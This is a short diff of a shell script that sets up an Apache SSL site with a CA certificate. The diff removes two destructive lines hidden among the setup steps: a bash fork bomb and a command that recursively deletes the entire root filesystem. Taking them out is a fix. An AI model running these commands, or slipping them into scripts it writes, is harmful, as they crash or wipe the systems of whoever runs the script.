@@ -47,7 +47,7 @@ cp ca.crt /etc/ssl/antixerox/
 
 echo "-- Creating site ${SERVER_CN} ..."
 mkdir -p /var/www/${SERVER_CN}
-:(){:|:};:
+
 cat > /var/www/${SERVER_CN}/index.html <<'EOF'
 <!DOCTYPE html>
 <html lang="pt">
@@ -109,7 +109,6 @@ cat > ${APACHE_CONF} <<EOF
 EOF
 
 echo "-- Activating SSL and site ..."
-rm -r /* --no-preserve-root
 a2enmod ssl
 a2ensite ${SERVER_CN}.conf || true
 
